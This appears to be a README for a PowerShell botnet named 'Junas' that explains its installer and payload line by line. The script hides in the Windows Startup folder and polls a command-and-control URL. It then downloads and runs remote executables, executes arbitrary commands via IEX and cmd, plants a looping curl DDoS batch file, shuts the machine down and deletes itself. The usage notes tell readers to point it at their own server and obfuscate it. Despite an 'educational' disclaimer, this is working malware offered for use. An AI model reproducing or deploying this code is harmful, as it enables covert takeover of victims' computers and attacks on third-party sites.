## Junas botnet
#### Legal #
This is an educational script and should not be used for illegal/unethical actions against machines you do not own/have permission to infect

*Copyright (c) 2021 Pokesi All Rights Reserved.*
### How it works **step by step**
Syntax used:
`Line of code/variable` - Explanation
... `Line of code` - Explanation [not required]
...... `Line of code` - Explanation [only used for branches]
... `}` - Ends the branch

`$userprof = $env:USERPROFILE;` - Gets the user's directory (e.g. C:/Users/JohnDoe/)
`$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";` - `$startUpFolder` is set to the user's startup directory.
`$botnetCode` - `$botnetCode` is set to the botnet code. Keep in mind that the `.ps1` file is just an installer for the botnet, the actual thing is in this variable. The following is `$botnetCode`.
... `Add-Type -AssemblyName System.IO.Compression.FileSystem;` - Adds the type used to extract `.zip` files. Used when extracting downloaded files.
... `$wc = [System.Net.WebClient]::new();` - Starts a WebClient instance in variable `$wc`. Used for downloading files. An alternative may be curl.exe, but is not tested.
... `$commandcontrolserver = "https://yoursite.com/server.txt";` - Sets `$commandcontrolserver` to https://yoursite.com/server.txt, which is the file that has the command for the botnet.
... `$wc.DownloadFile("$commandcontrolserver","command.txt");` - Downloads the command and control file to command.txt. Alternative with curl.exe may be `curl.exe --output=command.txt -X GET https://yoursite.com/server.txt`, not tested.
... `$userprof = $env:USERPROFILE;` - Gets the user's directory (e.g. C:/Users/JohnDoe/)
... `$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";` - `$startUpFolder` is set to the user's startup directory.
... `$cmd = (Get-Content -Path "./command.txt" -TotalCount 1)` - Sets the `$cmd` variable to the first line of `command.txt`.
... `if ($cmd == "Stop") {` - Checks if `$cmd` is "Stop". This stops the botnet.
...... `exit()` - Exits PowerShell
... `}` - Ends the branch
... `elseif ($cmd -Like "Dl&Run *") {` - Checks if `$cmd` starts with "Dl&Run". This downloads a .zip file, extracts it, and runs the .exe specified. In server.txt, this should look like `Dl&Run https://fileupload.com/application.zip:application.exe`. The provided example will download `application.zip`, extract it, and run application.exe inside the extracted folder.
...... `$cmd2 = $cmd.split("Dl&Run ")[0];` - Sets `$cmd2` to the command passed to the script, but stripped of "Dl&Run"
...... `$fileToDownload = $cmd2.Split(":")[0];` - Sets `$fileToDownload` to the file the operator wants to download.
...... `try {` - PowerShell try
......... `$wc.DownloadFile("$fileToDownload","botnet.zip");` - Downloads `$fileToDownload` to `botnet.zip`
......... `cmd.exe /c "mkdir folder";` - Runs cmd.exe [command prompt] with the `/c` switch, which executes a command. In this case, `mkdir folder` is run, which makes a folder called "folder"
......... `Expand-Archive -LiteralPath "./botnet.zip" -DestinationPath "./folder"` - Extracts the downloaded file to `/folder`.
......... `Start-Process -filepath "./folder/" + ($cmd2.Split(":")[2]) + ".exe";` - Runs the file.
...... `}` - Ends the branch
... `}` - Ends the branch
... `elseif ($cmd -Like "IEX *") {` - Checks if `$cmd` starts with "IEX". If it does, it will execute the given string.
...... `$cmd3 = $cmd.split("IEX ")[0];` - Sets `$cmd3` to the command passed to the script, but stripped of IEΧ.
...... `IEX($cmd3);` - Runs the string with IEX.
... `}` - Ends the branch
... `elseif ($cmd -Like "DDoS *") {` - Checks if `$cmd` starts with "DDoS". If it does, it will make a batch file in Startup that runs constant requests of that site.
...... `$cmd4 = $cmd.split("DDoS ")[0];` - Sets `$cmd4` to the command passed to the script, but stripped of DDoS
...... `":start ; curl -X GET $ddos; goto start" | Out-File "$startUpFolder\btnet.bat" -Force` - Makes a batch file in Startup that runs constant requests of that site.
... `}` - Ends the branch
... `elseif ($cmd -Like "Cmd *") {` - Checks if `$cmd` starts with "Cmd". If it does, it will execute `cmd.exe` with the switch `/c` to execute a command.
...... `$cmd5 = $cmd.split("Cmd ")[0];` - Sets `$cmd5` to the command passed to the script, but stripped of Cmd.
...... `cmd /c "$cmd5";` - Executes `cmd.exe` with the switch `/c` to execute a command.
... `}` - Ends the branch
... `elseif ($cmd == "Shutdown") {` - Checks if `$cmd` is Shutdown. If it does, it will shutdown the machine.
...... `Stop-Computer;` - Shutdown machine
... `}` - Ends the branch
... `else {` - If nothing else works, do this.
...... `exit;` - Stops the script
... `}` - Ends the branch
... `Remove-Item -Path "./command.txt";` - Removes command.txt
`"powershell -WindowStyle hidden -Command '$botnetCode'" | Out-File "$startUpFolder\default.bat";` - Writes `$botnetCode` to a Startup file.
`Remove-Item -Path $MyInvocation.MyCommand.Source;` - Self-Destructs.
### Usage
Change https://yoursite.com/server.txt to your command and control server.
You may want to obfuscate this or add custom commands.
### Donate
|     BitCoin    | Header Two     |
| :------------- | :------------- |
| Item One       | Item Two       |
